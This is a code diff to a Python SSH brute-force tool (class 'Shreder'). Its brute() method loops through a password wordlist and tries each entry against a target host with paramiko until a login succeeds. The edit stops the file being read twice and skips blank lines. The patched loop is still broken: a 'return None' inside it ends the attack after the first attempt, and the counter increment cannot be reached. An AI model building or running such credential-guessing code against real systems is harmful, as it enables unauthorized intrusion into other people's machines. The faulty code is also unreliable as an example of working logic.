@@ -33,19 +33,20 @@ class Shreder(Badges):
     def brute(self, host, port, username, dictionary):
         with open(dictionary, 'r') as f:
             state = 1
-            total = len(f.read().split('\n'))
+            lines = f.read().split('\n')
 
-            for password in f.read().split('\n'):
-                ssh = paramiko.client.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            for password in lines:
+                if password.strip():
+                    ssh = paramiko.client.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-                self.print_multi(f"Trying ({password}) on of ({str(state)}/{str(total)}) ...")
-                try:
-                    ssh.connect(host, port=int(port), username=username, password=password)
-                except paramiko.AuthenticationException:
-                    ssh.close()
-                else:
-                    return password
-                return None
+                    self.print_multi(f"Trying ({password})... ({str(state)}/{str(len(lines))})")
+                    try:
+                        ssh.connect(host, port=int(port), username=username, password=password)
+                    except paramiko.AuthenticationException:
+                        ssh.close()
+                    else:
+                        return password
+                    return None
 
-                state += 1
+                    state += 1
